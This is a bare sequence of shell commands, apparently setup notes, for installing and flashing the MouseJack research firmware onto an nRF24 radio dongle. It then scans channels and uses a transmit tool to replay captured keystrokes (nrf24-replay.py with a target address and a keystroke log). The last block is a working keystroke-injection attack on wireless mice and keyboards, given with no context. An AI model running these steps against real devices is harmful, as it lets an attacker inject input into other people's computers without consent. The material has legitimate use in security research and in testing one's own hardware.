
```
sudo apt-get install -y sdcc binutils python3 python3-pip python3-virtualenv 

git clone https://github.com/BastilleResearch/mousejack
```


```
cd mousejack
git submodule init
git submodule update
cd nrf-research-firmware
virtualenv -p /usr/bin/python2 venv
source venv/bin/activate
python2 -m pip install pyusb
cp -r ./venv/lib/python2.7/site-packages/usb ./prog/usb-flasher/
sudo make install
sudo python2 nrf24-scanner.py -c {1..20}
```

```
git clone https://github.com/iamckn/mousejack_transmit.git
cd mousejack_transmit
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
sudo python2.7 get-pip.py
sudo python2 -m pip install --upgrade setuptools
sudo python2 -m pip install pyusb==1.0
sudo python2 nrf24-replay.py -a 1F:6C:44:72:02 --input logs/keystrokes.log 
```